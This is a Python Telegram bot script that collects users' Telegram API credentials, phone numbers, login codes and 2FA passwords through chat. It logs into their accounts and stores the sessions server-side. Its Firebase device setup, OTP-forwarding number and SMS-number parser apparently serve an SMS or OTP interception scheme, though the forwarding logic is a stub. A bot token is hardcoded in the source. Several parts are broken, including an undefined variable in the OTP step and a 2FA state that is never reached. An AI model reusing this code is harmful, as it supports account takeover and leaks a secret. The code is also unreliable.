#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
import sys
import asyncio
from datetime import datetime
from collections import deque
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8847861305:AAE3g8M8LL2erCgKiP_HFmoBhJBcSztDVeo")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8847861305:AAE3g8M8LL2erCgKiP_HFmoBhJBcSztDVeo")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# USER CONFIG
# ============================
USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}
processed_messages = set()

# Telethon Clients Storage
telethon_clients = {}  # user_id -> client
telethon_running = {}  # user_id -> bool

# Login States
API_ID, API_HASH, PHONE_NUMBER, OTP_CODE, PASSWORD = range(5)

def load_user_configs():
    global user_configs, last_otp
    try:
        if os.path.exists(USER_CONFIG_FILE):
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            for uid, cfg in user_configs.items():
                if "last_otp_value" in cfg:
                    last_otp[uid] = cfg["last_otp_value"]
            logger.info(f"✅ Loaded configs for {len(user_configs)} users")
        else:
            user_configs = {}
    except Exception as e:
        logger.error(f"Config load error: {e}")
        user_configs = {}

def save_user_configs():
    try:
        with open(USER_CONFIG_FILE, "w") as f:
            json.dump(user_configs, f, indent=2)
    except Exception as e:
        logger.error(f"Config save error: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# SEND STATUS
# ============================
def send_status(user_id, status_type, details):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        if status_type == "login_success":
            text = (
                f"✅ <b>Login Successful!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {details.get('name', 'Unknown')}\n"
                f"📱 <b>Phone:</b> <code>{details.get('phone', 'N/A')}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Connected ✅"
            )
        elif status_type == "error":
            text = f"⚠️ <b>Error:</b> {details.get('error', 'Unknown error')}"
        elif status_type == "status":
            text = f"ℹ️ {details.get('message', 'Processing...')}"
        else:
            return
        
        data = {
            "chat_id": int(user_id),
            "text": text,
            "parse_mode": "HTML"
        }
        threading.Thread(target=lambda: requests.post(url, json=data, timeout=5)).start()
    except Exception as e:
        logger.error(f"Status send error: {e}")

# ============================
# START / HELP
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            f"{BOT_NAME} <b>WELCOME</b>\n\n"
            f"<b>Commands:</b>\n"
            f"/login – Login with Telegram Account\n"
            f"/logout – Logout\n"
            f"/status – Check login status\n"
            f"/setup – Configure Firebase & Channel\n"
            f"/devices – Select device\n"
            f"/setotp – Set forwarding number\n"
            f"/help – Show this message",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Start error: {e}")

# ============================
# LOGIN SYSTEM - FIXED FOR RAILWAY
# ============================
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id in telethon_clients and telethon_clients[user_id] is not None:
            await update.message.reply_text(
                "<b>✅ Already logged in!</b>\nUse /logout first.",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>🔐 Telegram Login</b>\n\n"
            f"<b>Step 1/5:</b> Send your <b>API ID</b>\n"
            f"Get it from: https://my.telegram.org/apps\n"
            f"Type /cancel to abort.",
            parse_mode='HTML'
        )
        return API_ID
    except Exception as e:
        logger.error(f"Login start error: {e}")
        return

async def login_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        try:
            api_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text(
                "<b>❌ API ID must be a number!</b>",
                parse_mode='HTML'
            )
            return API_ID
        
        context.user_data['api_id'] = api_id
        await update.message.reply_text(
            f"<b>✅ API ID saved: {api_id}</b>\n\n"
            f"<b>Step 2/5:</b> Send your <b>API Hash</b>",
            parse_mode='HTML'
        )
        return API_HASH
    except Exception as e:
        logger.error(f"Login API ID error: {e}")
        return API_ID

async def login_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        api_hash = update.message.text.strip()
        if len(api_hash) < 10:
            await update.message.reply_text(
                "<b>❌ Invalid API Hash!</b>",
                parse_mode='HTML'
            )
            return API_HASH
        
        context.user_data['api_hash'] = api_hash
        await update.message.reply_text(
            f"<b>✅ API Hash saved</b>\n\n"
            f"<b>Step 3/5:</b> Send your <b>Phone Number</b>\n"
            f"Example: <code>+919876543210</code>",
            parse_mode='HTML'
        )
        return PHONE_NUMBER
    except Exception as e:
        logger.error(f"Login API Hash error: {e}")
        return API_HASH

async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        phone = update.message.text.strip()
        # Clean phone number
        phone = re.sub(r'[^0-9+]', '', phone)
        if not re.match(r"^\+?[0-9]{10,15}$", phone):
            await update.message.reply_text(
                "<b>❌ Invalid Phone Number!</b>\n"
                "Use: +919876543210",
                parse_mode='HTML'
            )
            return PHONE_NUMBER
        
        context.user_data['phone'] = phone
        user_id = str(update.effective_user.id)
        
        await update.message.reply_text(
            f"<b>🔄 Connecting to Telegram...</b>\n\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"⏳ Please wait...",
            parse_mode='HTML'
        )
        
        # Start login in a separate thread with proper async handling
        def do_login():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(perform_login(user_id, context.user_data['api_id'], context.user_data['api_hash'], phone, update.message.chat_id))
            except Exception as e:
                logger.error(f"Login thread error: {e}")
                send_status(user_id, "error", {"error": str(e)})
        
        threading.Thread(target=do_login, daemon=True).start()
        
        # Wait for OTP to be sent
        time.sleep(5)
        
        await update.message.reply_text(
            f"<b>📱 OTP Code Sent!</b>\n\n"
            f"<b>Step 4/5:</b> Send the <b>OTP Code</b>\n"
            f"Check your Telegram App or SMS\n"
            f"Type /cancel to abort.",
            parse_mode='HTML'
        )
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login phone error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return PHONE_NUMBER

async def perform_login(user_id, api_id, api_hash, phone, chat_id):
    """Perform actual login"""
    try:
        # Create client with proper session
        session_file = f"session_{user_id}"
        client = TelegramClient(session_file, api_id, api_hash)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            # Send OTP
            try:
                await client.send_code_request(phone)
                logger.info(f"✅ OTP sent to {phone}")
                send_status(user_id, "status", {"message": "OTP sent to your Telegram/SMS"})
            except Exception as e:
                logger.error(f"Send code error: {e}")
                send_status(user_id, "error", {"error": f"Failed to send OTP: {str(e)}"})
                return
            
            # Store client for OTP verification
            user_configs[user_id] = user_configs.get(user_id, {})
            user_configs[user_id]['temp_client'] = client
            user_configs[user_id]['temp_phone'] = phone
            save_user_configs()
        else:
            # Already authorized
            me = await client.get_me()
            telethon_clients[user_id] = client
            telethon_running[user_id] = True
            
            user_configs[user_id] = user_configs.get(user_id, {})
            user_configs[user_id]['logged_in'] = True
            user_configs[user_id]['phone'] = phone
            user_configs[user_id]['api_id'] = api_id
            user_configs[user_id]['api_hash'] = api_hash
            save_user_configs()
            
            send_status(user_id, "login_success", {
                "name": me.first_name or me.username or "Unknown",
                "phone": phone
            })
            
    except Exception as e:
        logger.error(f"Perform login error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def login_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        otp = update.message.text.strip()
        
        if not otp.isdigit():
            await update.message.reply_text(
                "<b>❌ OTP must be numbers only!</b>",
                parse_mode='HTML'
            )
            return OTP_CODE
        
        # Get client from temp storage
        if user_id not in user_configs:
            await update.message.reply_text(
                "<b>❌ Login session expired! Use /login again</b>",
                parse_mode='HTML'
            )
            return
        
        client = user_configs[user_id].get('temp_client')
        phone = user_configs[user_id].get('temp_phone')
        
        if not client:
            await update.message.reply_text(
                "<b>❌ No active login session! Use /login again</b>",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>🔄 Verifying OTP...</b>",
            parse_mode='HTML'
        )
        
        # Complete login in background
        def complete_login():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(verify_otp(user_id, client, otp, phone, update.message.chat_id))
            except Exception as e:
                logger.error(f"Complete login error: {e}")
                send_status(user_id, "error", {"error": str(e)})
        
        threading.Thread(target=complete_login, daemon=True).start()
        
        # Wait a bit
        time.sleep(3)
        
        # Check if login completed
        if user_id in telethon_clients and telethon_clients[user_id] is not None:
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"<b>⏳ Verifying...</b>\n"
            f"If you have 2FA, you'll be asked for password.",
            parse_mode='HTML'
        )
        
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login OTP error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return OTP_CODE

async def verify_otp(user_id, client, otp, phone, chat_id):
    """Verify OTP and complete login"""
    try:
        try:
            await client.sign_in(phone, code=otp)
        except SessionPasswordNeededError:
            # 2FA enabled
            user_configs[user_id]['needs_password'] = True
            user_configs[user_id]['temp_client'] = client
            save_user_configs()
            await context.bot.send_message(
                chat_id=chat_id,
                text="<b>🔐 2FA Password Required!</b>\nSend your 2FA password.",
                parse_mode='HTML'
            )
            return
        
        # Login successful
        me = await client.get_me()
        
        telethon_clients[user_id] = client
        telethon_running[user_id] = True
        
        # Setup message handler
        @client.on(events.NewMessage)
        async def handler(event):
            await telethon_message_handler(user_id, event)
        
        # Start client in background
        def run_client():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(client.run_until_disconnected())
            except Exception as e:
                logger.error(f"Client run error: {e}")
        
        threading.Thread(target=run_client, daemon=True).start()
        
        # Save config
        user_configs[user_id]['logged_in'] = True
        user_configs[user_id]['username'] = me.username or "Unknown"
        user_configs[user_id]['first_name'] = me.first_name or "Unknown"
        user_configs[user_id].pop('temp_client', None)
        save_user_configs()
        
        send_status(user_id, "login_success", {
            "name": me.first_name or me.username or "Unknown",
            "phone": phone
        })
        
        logger.info(f"✅ User {user_id} logged in as {me.first_name}")
        
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle 2FA password"""
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        
        if user_id not in user_configs:
            await update.message.reply_text(
                "<b>❌ Session expired! Use /login again</b>",
                parse_mode='HTML'
            )
            return
        
        client = user_configs[user_id].get('temp_client')
        phone = user_configs[user_id].get('temp_phone')
        
        if not client:
            await update.message.reply_text(
                "<b>❌ No active session!</b>",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>🔄 Verifying Password...</b>",
            parse_mode='HTML'
        )
        
        try:
            await client.sign_in(password=password)
        except Exception as e:
            await update.message.reply_text(
                f"<b>❌ Invalid password!</b>\nTry again.",
                parse_mode='HTML'
            )
            return
        
        # Login successful
        me = await client.get_me()
        
        telethon_clients[user_id] = client
        telethon_running[user_id] = True
        
        # Setup message handler
        @client.on(events.NewMessage)
        async def handler(event):
            await telethon_message_handler(user_id, event)
        
        # Start client in background
        def run_client():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(client.run_until_disconnected())
            except Exception as e:
                logger.error(f"Client run error: {e}")
        
        threading.Thread(target=run_client, daemon=True).start()
        
        user_configs[user_id]['logged_in'] = True
        user_configs[user_id]['username'] = me.username or "Unknown"
        user_configs[user_id]['first_name'] = me.first_name or "Unknown"
        user_configs[user_id].pop('temp_client', None)
        user_configs[user_id].pop('needs_password', None)
        save_user_configs()
        
        send_status(user_id, "login_success", {
            "name": me.first_name or me.username or "Unknown",
            "phone": phone
        })
        
        await update.message.reply_text(
            f"<b>✅ Login Successful!</b>",
            parse_mode='HTML'
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Login password error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return

async def telethon_message_handler(user_id, event):
    """Handle channel messages"""
    try:
        channel_id = event.chat_id
        
        if user_id not in user_configs:
            return
        
        cfg = user_configs[user_id]
        configured_channel = cfg.get('channel_id')
        
        if configured_channel != channel_id:
            return
        
        text = event.message.text
        if not text:
            return
        
        # Extract and process message
        to_number, msg = extract_number_message(text)
        
        if to_number:
            logger.info(f"📩 Processing for {to_number}")
            # Process SMS (add your SMS sending logic here)
            
    except Exception as e:
        logger.error(f"Telethon handler error: {e}")

def extract_number_message(text):
    """Extract number and message"""
    try:
        to_number = None
        msg = None
        
        # Various patterns
        patterns = [
            r"To:\s*([\d\+]+).*?Message:\s*(.+)",
            r"📞\s*To:\s*([\d\+]+).*?💬\s*Message:\s*(.+)",
            r"To\s*\(Tap to copy\):\s*([\d\+]+).*?Body\s*\(Tap to copy\):\s*(.+)",
            r"One-tap copy:\s*(.+?)\s*\|\s*(.+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                to_number = match.group(1).strip()
                msg = match.group(2).strip()
                break
        
        # Fallback
        if not to_number:
            match = re.search(r"(\+?[0-9]{10,15})", text)
            if match:
                to_number = match.group(1).strip()
                msg = "SMS from bot"
        
        if not to_number:
            return None, None
        
        if not msg:
            msg = "SMS from bot"
        
        return to_number, msg
    except Exception as e:
        logger.error(f"Extract error: {e}")
        return None, None

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        if user_id in telethon_clients:
            client = telethon_clients[user_id]
            if client:
                await client.disconnect()
            telethon_clients.pop(user_id, None)
            telethon_running.pop(user_id, None)
            
            # Clean session file
            session_file = f"session_{user_id}.session"
            if os.path.exists(session_file):
                os.remove(session_file)
            
            if user_id in user_configs:
                user_configs[user_id]['logged_in'] = False
                user_configs[user_id].pop('temp_client', None)
                save_user_configs()
        
        await update.message.reply_text(
            "<b>✅ Logged out successfully!</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Logout error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        if user_id in telethon_clients and telethon_clients[user_id] is not None:
            try:
                client = telethon_clients[user_id]
                me = await client.get_me()
                status_text = (
                    f"<b>✅ Logged In</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>Name:</b> {me.first_name or 'Unknown'}\n"
                    f"👤 <b>Username:</b> @{me.username or 'None'}\n"
                    f"📱 <b>Phone:</b> <code>{user_configs.get(user_id, {}).get('phone', 'N/A')}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"💡 Use /logout to disconnect"
                )
            except:
                status_text = "<b>⚠️ Connected but not responsive</b>"
        else:
            status_text = (
                f"<b>❌ Not Logged In</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"Use /login to connect your Telegram account"
            )
        
        await update.message.reply_text(status_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Status error: {e}")

async def login_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("<b>❌ Login cancelled.</b>", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Login cancel error: {e}")
    return ConversationHandler.END

# ============================
# SETUP CONVERSATION (Minimal)
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>",
            parse_mode='HTML'
        )
        return URL
    except Exception as e:
        logger.error(f"Setup start error: {e}")
        return

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        url = update.message.text.strip()
        if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
            await update.message.reply_text("<b>❌ Invalid URL!</b>", parse_mode='HTML')
            return URL
        context.user_data["firebase_url"] = url
        await update.message.reply_text(
            "<b>✅ URL saved.</b>\n\n<b>Step 2/2</b>: Send your <b>Channel ID</b>",
            parse_mode='HTML'
        )
        return CHANNEL
    except Exception as e:
        logger.error(f"Setup URL error: {e}")
        return URL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        try:
            channel_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text("<b>❌ Must be a number.</b>", parse_mode='HTML')
            return CHANNEL

        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None
        }
        save_user_configs()

        await update.message.reply_text(
            f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
            f"✅ Firebase: <code>{context.user_data['firebase_url']}</code>\n"
            f"📢 Channel: <code>{channel_id}</code>\n\n"
            f"Now use /devices to select device",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Setup channel error: {e}")
        return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DUMMY COMMANDS
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>📱 Devices feature</b>\n"
        "Make sure you're logged in with /login first",
        parse_mode='HTML'
    )

async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>📞 Set OTP Number</b>\n"
        "Use: /setotp +919876543210",
        parse_mode='HTML'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>✅ Reset successful!</b>",
        parse_mode='HTML'
    )

# ============================
# MAIN
# ============================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        # Login conversation
        login_conv = ConversationHandler(
            entry_points=[CommandHandler("login", login_start)],
            states={
                API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_id)],
                API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_hash)],
                PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_phone)],
                OTP_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_otp)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
            },
            fallbacks=[CommandHandler("cancel", login_cancel)],
        )
        app.add_handler(login_conv)

        # Setup conversation
        setup_conv = ConversationHandler(
            entry_points=[CommandHandler("setup", setup_start)],
            states={
                URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
                CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
            },
            fallbacks=[CommandHandler("cancel", setup_cancel)],
        )
        app.add_handler(setup_conv)

        # Commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("devices", devices_command))
        app.add_handler(CommandHandler("resetforward", reset_forward))
        app.add_handler(CommandHandler("logout", logout_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("setotp", setotp_command))

        logger.info("🚀 BOT STARTED ON RAILWAY!")
        logger.info("🔐 Login System: Active")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"Main error: {e}")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()